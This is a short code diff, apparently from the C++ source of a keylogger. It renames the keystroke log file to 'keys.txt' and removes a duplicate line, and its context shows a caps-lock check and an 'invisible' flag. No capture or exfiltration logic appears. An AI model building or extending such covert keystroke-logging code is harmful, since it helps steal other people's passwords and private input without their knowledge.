@@ -13,7 +13,7 @@
 
 using namespace std;
 
-const char LOGFILENAME[] = {"dat.txt"};
+const char LOGFILENAME[] = {"keys.txt"};
 
 int isCapsLock(void)
 {
@@ -460,9 +460,6 @@ int start(char* argv[])
     }
     return 1;
 }
-
-
-using namespace std;
 
 bool invisible = true;
 char fileName[MAX_PATH];
